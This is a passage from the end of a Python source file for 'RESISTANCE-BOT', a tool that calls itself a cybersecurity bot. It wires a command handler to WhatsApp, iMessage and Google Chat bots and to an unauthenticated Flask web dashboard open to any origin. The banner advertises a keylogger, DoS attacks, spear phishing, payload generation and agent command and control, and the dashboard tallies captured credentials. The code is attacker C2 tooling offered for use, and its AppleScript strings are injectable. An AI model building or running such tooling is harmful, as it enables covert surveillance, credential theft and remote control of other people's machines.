                                input_box.send_keys(Keys.ENTER)
                        except:
                            pass
                    time.sleep(2)
                except Exception as e:
                    logger.error(f"WhatsApp monitor error: {e}")
                    time.sleep(5)
        except Exception as e:
            logger.error(f"WhatsApp monitor error: {e}")
    
    def stop(self):
        self.running = False
        if self.driver:
            self.driver.quit()
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("WhatsApp bot started")
            return True
        return False

class GoogleChatBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "googlechat.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load Google Chat config error: {e}")
    
    def save_config(self, webhook_url: str):
        self.config = {"webhook_url": webhook_url, "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "googlechat.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save Google Chat config error: {e}")
            return False
    
    def start(self):
        self.running = True
        logger.info("Google Chat bot configured")
        return True
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('webhook_url'):
            self.start()
            logger.info("Google Chat bot started")
            return True
        return False

class iMessageBot:
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {}
    
    def load_config(self):
        config_file = os.path.join(CONFIG_DIR, "imessage.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Load iMessage config error: {e}")
    
    def save_config(self, phone_numbers: List[str] = None):
        self.config = {"phone_numbers": phone_numbers or [], "enabled": True}
        try:
            with open(os.path.join(CONFIG_DIR, "imessage.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save iMessage config error: {e}")
            return False
    
    def start(self):
        if not IMESSAGE_AVAILABLE:
            logger.error("iMessage only available on macOS")
            return False
        try:
            self.running = True
            threading.Thread(target=self._monitor_messages, daemon=True).start()
            return True
        except Exception as e:
            logger.error(f"Start iMessage bot error: {e}")
            return False
    
    def _monitor_messages(self):
        last_checked = {}
        while self.running:
            try:
                for number in self.config.get('phone_numbers', []):
                    messages = self._get_messages_from_number(number, last_checked.get(number))
                    for msg in messages:
                        text = msg['text']
                        if text.startswith('!'):
                            cmd = text[1:].strip()
                            result = self.handler.execute(cmd, f"imessage/{number}")
                            self._send_message(number, result.get('output', '')[:1000])
                    if messages:
                        last_checked[number] = messages[0]['timestamp']
                time.sleep(5)
            except Exception as e:
                logger.error(f"iMessage monitor error: {e}")
                time.sleep(10)
    
    def _get_messages_from_number(self, phone_number: str, since: float = None) -> List[Dict]:
        messages = []
        try:
            script = f'''
            tell application "Messages"
                set targetService to 1st service whose service type = iMessage
                set targetBuddy to buddy "{phone_number}" of targetService
                set recentMessages to messages of targetBuddy
                set messageList to {{}}
                repeat with i from 1 to count of recentMessages
                    if i > 10 then exit repeat
                    set msg to item i of recentMessages
                    set end of messageList to {{text:content of msg, timestamp:date of msg}}
                end repeat
                return messageList
            end tell
            '''
            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout:
                for line in result.stdout.strip().split(', '):
                    if ':' in line:
                        messages.append({'text': line, 'timestamp': time.time()})
        except Exception as e:
            logger.error(f"Get iMessages error: {e}")
        return messages
    
    def _send_message(self, recipient: str, message: str):
        try:
            script = f'''
            tell application "Messages"
                set targetService to 1st service whose service type = iMessage
                set targetBuddy to buddy "{recipient}" of targetService
                send "{message}" to targetBuddy
            end tell
            '''
            subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
        except Exception as e:
            logger.error(f"Send iMessage error: {e}")
    
    def start_bot_thread(self):
        if self.config.get('enabled') and IMESSAGE_AVAILABLE:
            threading.Thread(target=self.start, daemon=True).start()
            logger.info("iMessage bot started")
            return True
        return False

# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    def __init__(self, handler: CommandHandler, db: DatabaseManager, config: ConfigManager):
        self.handler = handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        TEMPLATE = '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>RESISTANCE-BOT - Cybersecurity Dashboard</title>
            <style>
                :root{
                    --navy-deep: #061527;
                    --navy: #0b2038;
                    --navy-panel: #0e2944;
                    --blue-mid: #1565c0;
                    --blue-bright: #3f9dff;
                    --cyan: #6fe3ff;
                    --white: #f4f9ff;
                    --slate: #7f9bbd;
                    --line: #1c3a5e;
                }
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { 
                    font-family: 'Courier New', monospace;
                    background: var(--navy-deep);
                    color: var(--white);
                    min-height: 100vh;
                }
                .header {
                    background: var(--navy);
                    padding: 20px;
                    text-align: center;
                    border-bottom: 2px solid var(--blue-bright);
                }
                .header h1 { 
                    font-size: 2.5em; 
                    color: var(--white);
                    text-shadow: 0 0 20px rgba(63,157,255,0.3);
                    letter-spacing: 4px;
                }
                .header h1 span { color: var(--cyan); }
                .header p { color: var(--slate); font-size: 0.9em; letter-spacing: 2px; }
                .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                    gap: 15px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    background: var(--navy-panel);
                    border: 1px solid var(--line);
                    border-radius: 8px;
                    padding: 20px;
                    text-align: center;
                }
                .stat-card:hover { border-color: var(--blue-bright); }
                .stat-card h3 { 
                    font-size: 2em; 
                    color: var(--cyan);
                    font-weight: normal;
                }
                .stat-card p { margin-top: 10px; opacity: 0.6; color: var(--slate); font-size: 0.8em; }
                .section {
                    background: var(--navy-panel);
                    border: 1px solid var(--line);
                    border-radius: 8px;
                    padding: 20px;
                    margin-bottom: 20px;
                }
                .section h2 { 
                    margin-bottom: 15px; 
                    color: var(--white);
                    border-bottom: 1px solid var(--line);
                    padding-bottom: 10px;
                    letter-spacing: 2px;
                }
                table { width: 100%; border-collapse: collapse; color: var(--white); }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--line); }
                th { background: var(--navy); color: var(--cyan); }
                .command-input {
                    width: 100%;
                    padding: 15px;
                    background: var(--navy);
                    border: 1px solid var(--line);
                    border-radius: 4px;
                    color: var(--white);
                    font-size: 16px;
                    font-family: 'Courier New', monospace;
                    margin-bottom: 10px;
                }
                .command-input:focus { outline: none; border-color: var(--blue-bright); }
                button {
                    background: var(--blue-mid);
                    color: var(--white);
                    border: 1px solid var(--blue-bright);
                    padding: 12px 30px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                    font-family: 'Courier New', monospace;
                }
                button:hover { background: var(--blue-bright); }
                .output {
                    background: var(--navy);
                    border-radius: 4px;
                    padding: 15px;
                    font-family: 'Courier New', monospace;
                    margin-top: 15px;
                    white-space: pre-wrap;
                    max-height: 400px;
                    overflow-y: auto;
                    color: var(--white);
                    border: 1px solid var(--line);
                }
                .status-badge {
                    display: inline-block;
                    padding: 4px 8px;
                    border-radius: 2px;
                    font-size: 12px;
                }
                .status-online { background: rgba(111,227,255,0.15); color: var(--cyan); }
                .status-offline { background: rgba(255,0,0,0.15); color: #ff6b6b; }
                .severity-critical { background: rgba(255,0,0,0.2); color: #ff6b6b; }
                .severity-high { background: rgba(255,150,0,0.2); color: #ff9800; }
                .severity-medium { background: rgba(255,255,0,0.15); color: #ffc107; }
                .severity-low { background: rgba(111,227,255,0.1); color: var(--cyan); }
                ::-webkit-scrollbar { width: 4px; }
                ::-webkit-scrollbar-track { background: var(--navy); }
                ::-webkit-scrollbar-thumb { background: var(--blue-bright); }
                .warning-banner {
                    background: var(--navy);
                    padding: 10px;
                    text-align: center;
                    color: var(--slate);
                    font-size: 12px;
                    border-top: 1px solid var(--line);
                }
                .terminal-cursor {
                    display: inline-block;
                    width: 10px;
                    height: 20px;
                    background: var(--cyan);
                    animation: blink 1s infinite;
                }
                @keyframes blink {
                    0%, 50% { opacity: 1; }
                    51%, 100% { opacity: 0; }
                }
            </style>
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <script>
                var socket = io();
                socket.on('command_result', function(data) {
                    var outputDiv = document.getElementById('command-output');
                    outputDiv.innerHTML = '<span style="color:var(--cyan)">$></span> ' + data.command + '<br>' +
                                          '<span style="color:var(--cyan)">output></span><br>' + data.output + '<br>' +
                                          '<span style="color:var(--cyan)">time></span> ' + data.execution_time + 's';
                });
                function executeCommand() {
                    var command = document.getElementById('command').value;
                    if (command) {
                        fetch('/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ command: command })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                document.getElementById('command-output').innerHTML = 
                                    '<span style="color:var(--cyan)">$></span> ' + command + '<br>' +
                                    '<span style="color:var(--cyan)">output></span><br>' + data.output + '<br>' +
                                    '<span style="color:var(--cyan)">time></span> ' + data.execution_time + 's';
                            } else {
                                document.getElementById('command-output').innerHTML = 
                                    '<span style="color:#ff6b6b">error></span> ' + data.error;
                            }
                        });
                    }
                }
                document.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') { executeCommand(); }
                });
            </script>
        </head>
        <body>
            <div class="header">
                <h1>🛡️ RESISTANCE-<span>BOT</span></h1>
                <p>▸ ADVANCED CYBERSECURITY COMMAND & CONTROL PLATFORM</p>
            </div>
            <div class="container">
                <div class="stats-grid" id="stats">
                    <div class="stat-card"><h3 id="statCommands">0</h3><p>COMMANDS EXECUTED</p></div>
                    <div class="stat-card"><h3 id="statThreats">0</h3><p>THREATS DETECTED</p></div>
                    <div class="stat-card"><h3 id="statBlocked">0</h3><p>BLOCKED IPS</p></div>
                    <div class="stat-card"><h3 id="statCreds">0</h3><p>CREDENTIALS CAPTURED</p></div>
                    <div class="stat-card"><h3 id="statReports">0</h3><p>REPORTS GENERATED</p></div>
                </div>
                <div class="section">
                    <h2>🚀 COMMAND CENTER</h2>
                    <div style="display:flex; gap:10px;">
                        <span style="color:var(--cyan); font-size:20px;">$></span>
                        <input type="text" id="command" class="command-input" placeholder="Enter command..." style="flex:1;">
                        <button onclick="executeCommand()">EXECUTE</button>
                    </div>
                    <div id="command-output" class="output">
                        <span style="color:var(--cyan)">system></span> Ready for commands...
                        <span class="terminal-cursor"></span>
                    </div>
                </div>
                <div class="section">
                    <h2>📊 RECENT THREATS</h2>
                    <div id="threats">
                        <table>
                            <thead><tr><th>TIME</th><th>TYPE</th><th>SOURCE IP</th><th>SEVERITY</th></tr></thead>
                            <tbody id="threats-table"></tbody>
                        </table>
                    </div>
                </div>
            </div>
            <div class="warning-banner">
                ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY — ALL ACTIVITY IS LOGGED
            </div>
            <script>
                function loadStats() {
                    fetch('/api/stats')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('statCommands').textContent = data.total_commands || 0;
                            document.getElementById('statThreats').textContent = data.total_threats || 0;
                            document.getElementById('statBlocked').textContent = data.blocked_ips || 0;
                            document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                            document.getElementById('statReports').textContent = data.total_reports || 0;
                        });
                }
                function loadThreats() {
                    fetch('/api/threats')
                        .then(response => response.json())
                        .then(data => {
                            var html = '';
                            data.threats.forEach(function(threat) {
                                var severityClass = 'severity-' + threat.severity;
                                html += '<tr><td>' + threat.timestamp + '</td><td>' + threat.threat_type + '</td><td>' + threat.source_ip + '</td><td><span class="status-badge ' + severityClass + '">' + threat.severity.toUpperCase() + '</span></td></tr>';
                            });
                            document.getElementById('threats-table').innerHTML = html;
                        });
                }
                loadStats(); loadThreats();
                setInterval(loadStats, 5000);
                setInterval(loadThreats, 5000);
            </script>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20)
            return jsonify({'threats': threats})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# MAIN APPLICATION
# =====================
class ResistanceBot:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.report_gen = ReportGenerator(self.db, self.config)
        self.payload_gen = PayloadGenerator(self.db, self.config)
        self.keylogger = KeyloggerModule(self.db, self.config) if KEYLOGGER_AVAILABLE else None
        self.domain_hosting = DomainHostingEngine(self.db, self.config)
        self.handler = CommandHandler(
            self.db, self.config, self.payload_gen,
            self.keylogger, self.domain_hosting, self.report_gen
        )
        
        # Platform bots
        self.discord = DiscordBot(self.handler, self.db)
        self.telegram = TelegramBot(self.handler, self.db)
        self.slack = SlackBot(self.handler, self.db)
        self.signal = SignalBot(self.handler, self.db)
        self.whatsapp = WhatsAppBot(self.handler, self.db)
        self.google_chat = GoogleChatBot(self.handler, self.db)
        self.imessage = iMessageBot(self.handler, self.db)
        
        self.web = WebDashboard(self.handler, self.db, self.config)
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ACCENT}        🛡️ RESISTANCE-BOT v{VERSION} - Cybersecurity Bot                      {Colors.PRIMARY}║
║{Colors.ACCENT}        {LINES_OF_CODE}                                               {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🛡️ 5000+ Security Commands               • 📡 Ping / Nmap / Curl / Netcat{Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔌 SSH Remote Command Execution        • 🚀 Traffic Generation          {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🕷️ Web Vulnerability Scanning           • 🎣 Social Engineering Suite   {Colors.PRIMARY}║
║{Colors.SUCCESS}  • ⌨️ Advanced Keylogger (F10)             • 💥 DOS Attack Capabilities    {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📧 Spear Phishing Campaigns            • 🤖 Agent Command & Control    {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📱 Multi-Platform Bot Integration      • 💻 Web Dashboard              {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Discord | Telegram | Slack             • Signal | WhatsApp | iMessage  {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔒 IP Management & Threat Detection     • 🌐 Domain Translation         {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📊 PDF/JSON Reports                    • 💀 Payload Generation         {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                    🎯 50+     ADVANCED CYBERSECURITY COMMANDS                       {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SECONDARY}🛡️ Welcome to RESISTANCE-BOT - Your Ultimate Security Assistant{Colors.RESET}
{Colors.SECONDARY}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.SECONDARY}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.SECONDARY}🌐 Web dashboard available at http://localhost:5000 (if enabled){Colors.RESET}
{Colors.SECONDARY}📊 Use 'report_both <target>' to generate reports{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WEB_AVAILABLE else Colors.WARNING}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if KEYLOGGER_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if KEYLOGGER_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SIGNAL_AVAILABLE else Colors.WARNING}✅ signal-cli{Colors.RESET}" if SIGNAL_AVAILABLE else f"{Colors.WARNING}⚠️ signal-cli not found - Signal disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if PDF_AVAILABLE else Colors.WARNING}✅ reportlab{Colors.RESET}" if PDF_AVAILABLE else f"{Colors.WARNING}⚠️ reportlab not found - PDF reports disabled{Colors.RESET}")
        
        if shutil.which('nikto'):
            print(f"{Colors.SUCCESS}✅ nikto{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ nikto not found{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.PRIMARY}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, prefix)
                self.discord.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            api_id = input(f"{Colors.ACCENT}Enter API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.ACCENT}Enter API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.ACCENT}Enter Bot Token (optional): {Colors.RESET}").strip()
            if api_id and api_hash:
                self.telegram.save_config(api_id, api_hash, bot_token)
                self.telegram.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.ACCENT}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Slack bot token: {Colors.RESET}").strip()
            app_token = input(f"{Colors.ACCENT}Enter App token (optional): {Colors.RESET}").strip()
            if token:
                self.slack.save_config(token, app_token)
                self.slack.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.ACCENT}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter phone number: {Colors.RESET}").strip()
            if phone:
                self.signal.save_config(phone)
                self.signal.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Signal bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.ACCENT}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter phone number (optional): {Colors.RESET}").strip()
            self.whatsapp.save_config(phone)
            self.whatsapp.start_bot_thread()
            print(f"{Colors.SUCCESS}✅ WhatsApp bot starting...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.ACCENT}Configure Google Chat webhook? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.ACCENT}Enter webhook URL: {Colors.RESET}").strip()
            if webhook:
                self.google_chat.save_config(webhook)
                self.google_chat.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Google Chat bot configured...{Colors.RESET}")
        
        # iMessage (macOS only)
        if IMESSAGE_AVAILABLE:
            setup = input(f"{Colors.ACCENT}Configure iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                numbers = input(f"{Colors.ACCENT}Enter phone numbers (space-separated): {Colors.RESET}").strip()
                if numbers:
                    self.imessage.save_config(numbers.split())
                    self.imessage.start_bot_thread()
                    print(f"{Colors.SUCCESS}✅ iMessage bot starting...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.ACCENT}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.ACCENT}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.ACCENT}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.enabled', True)
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.config.save()
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        setup_platforms = input(f"\n{Colors.ACCENT}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        print(f"\n{Colors.SUCCESS}✅ RESISTANCE-BOT ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.SECONDARY}   Type 'help' for commands, 'report_both <target>' for reports{Colors.RESET}")
        print(f"{Colors.SECONDARY}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.SECONDARY}   📊 Reports saved to: {REPORTS_DIR}{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.ACCENT}{self.session_id}{Colors.PRIMARY}]{Colors.WHITE} 🛡️> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.PRIMARY}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}📊 Reports: {REPORTS_DIR}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.PRIMARY}🛡️ Starting RESISTANCE-BOT...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality{Colors.RESET}")
        
        app = ResistanceBot()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()